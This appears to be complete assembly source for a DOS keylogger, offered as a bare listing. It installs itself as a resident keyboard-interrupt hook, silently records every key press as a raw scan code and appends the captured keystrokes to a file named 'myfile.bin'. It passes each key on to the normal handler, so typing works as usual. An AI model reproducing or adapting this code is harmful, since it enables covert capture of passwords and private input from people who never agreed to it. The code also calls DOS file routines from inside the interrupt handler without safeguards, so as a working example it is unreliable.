.model tiny
.code
org 100h

Begin:
  jmp Install

Old09h dd ?
FName db 'myfile.bin',0
BufSize equ 256
Buf db BufSize dup(?)
Count dw 0
flag dw 0
position dw 0

WriteBuffer proc
  push ax
  push bx
  push cx
  push dx

  cmp Count, 0
  je WriteBuffer_End

  cmp flag, 0
  jne FileExists

  mov ah, 3ch
  mov cx, 1
  mov dx, offset FName
  int 21h
  jc WriteBuffer_End
  mov flag, 1
  jmp WriteData

FileExists:
  mov ah, 3dh
  mov al, 2
  mov dx, offset FName
  int 21h
  jc WriteBuffer_End

WriteData:
  mov bx, ax

  mov ah, 42h
  mov al, 2
  mov cx, 0
  mov dx, 0
  int 21h
  jc CloseFile

  mov ah, 40h
  mov cx, Count
  mov dx, offset Buf
  int 21h

  add position, ax

CloseFile:
  mov ah, 3eh
  int 21h
  mov Count, 0

WriteBuffer_End:
  pop dx
  pop cx
  pop bx
  pop ax
  ret
WriteBuffer endp

New09h:
  push ds
  push cs
  pop ds

  push ax
  push bx
  push cx
  push dx

  in al, 60h

  test al, 80h ;????
  jnz SkipKey

  mov bx, Count
  mov Buf[bx], al
  inc Count

  cmp Count, BufSize
  jb SkipWrite
  call WriteBuffer

SkipWrite:
SkipKey:
  pop dx
  pop cx
  pop bx
  pop ax
  pop ds
  jmp DWORD PTR cs:Old09h

ResSize = $ - Begin

Install:
  mov ax, 3509h
  int 21h
  mov WORD PTR Old09h, bx
  mov WORD PTR Old09h+2, es

  mov ax, 2509h
  mov dx, offset New09h
  int 21h
  mov ax, 3100h
  mov dx, (ResSize + 10fh) / 16
  int 21h

end Begin